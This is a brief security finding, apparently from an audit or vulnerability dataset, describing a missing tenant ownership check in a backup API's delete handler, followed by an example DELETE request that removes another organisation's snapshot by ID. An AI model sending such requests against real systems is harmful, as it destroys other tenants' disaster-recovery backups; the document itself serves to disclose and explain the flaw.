diagnosis: BackupSnapshotResource overrides obj_delete and retrieves CloudBackupSnapshot directly by primary key from kwargs['pk']. It never validates that the snapshot belongs to bundle.request.user.tenant. An authenticated user can send a DELETE request specifying another organization's snapshot primary key and destroy their disaster recovery backups.
exploit_request:
DELETE /api/v1/backups/4819/ HTTP/1.1
Host: backups.cloudvault.net
Authorization: ApiKey attacker_user:sec_key_4481
Accept: application/json
